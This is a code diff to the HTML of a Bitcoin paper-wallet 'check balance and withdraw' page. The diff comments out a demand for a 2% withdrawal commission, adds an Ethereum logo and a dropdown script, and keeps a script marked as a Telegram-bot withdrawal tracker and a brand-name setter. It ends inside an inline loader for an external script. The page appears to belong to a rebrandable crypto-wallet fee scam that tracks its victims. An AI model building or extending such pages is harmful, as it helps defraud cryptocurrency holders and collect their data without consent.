@@ -169,7 +169,7 @@
     </div>
     <br>
     <ul class="check-balance__advs">
-      <li>> Scan Public Address QR code to deposit paper wallet or to check available balance.</li>
+      <!-- <li>> Scan Public Address QR code to deposit paper wallet or to check available balance.</li> -->
       <li>> PRIVATE key gives you complete access to your funds on Bitcoin paper wallet.</li>
       <li>> DO NOT REVEAL or SHARE THE PRIVATE KEY until you withdraw funds from Bitcoin paper wallet to your own
         cryptocurrency wallet.</li>
@@ -178,15 +178,22 @@
     </ul>
   </div>
 
-  <div class="container check-balance">
-    <p class="text-center text-danger">To withdraw funds from paper wallet you must pay a 2% commission of the current
+  <div style="display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+" class="container check-balance">
+    <!-- <p class="text-center text-danger">To withdraw funds from paper wallet you must pay a 2% commission of the current
       amount on the Bitcoin paper wallet! <br>IMPORTANT! The secret Private key can be used only once, after that it
       will not be valid.</p>
 
     <p class="email-confirm__descr green-text mt-4 text-sm-center text-left">After 2 confirmations on blockchain the
-      commission fee will be confirmed, transfer invoice and activation code will be send to email</p>
-
-    <button class="check-balance__btn green-btn" onclick="window.location.href = 'withdraw.html';">Withdraw wallet
+      commission fee will be confirmed, transfer invoice and activation code will be send to email</p> -->
+    <figure>
+      <img style="width: 80px;" src="img/ethereum.gif" alt="Print Your Wallet Logo">
+    </figure>
+    <button style="margin-top: 25px;" class="check-balance__btn green-btn"
+      onclick="window.location.href = 'withdraw.html';">Withdraw wallet
       balance</button>
 
   </div>
@@ -328,8 +335,10 @@
   <script src="assets/js/getPrices.js"></script>
   <!--Telegram bot-->
   <script src="assets/js/withdrawTracker-2.js"></script>
-  <script src="assets/js/loader.js"></script>
+  <script type="module" src="assets/js/loader.js"></script>
+  <script src="assets/js/dropdown.js"></script>
   <script src="assets/js/setBrandName.js"></script>
+
   <script>
     (function (u) {
       var s = document.createElement('script'); s.async = true; s.src = u;
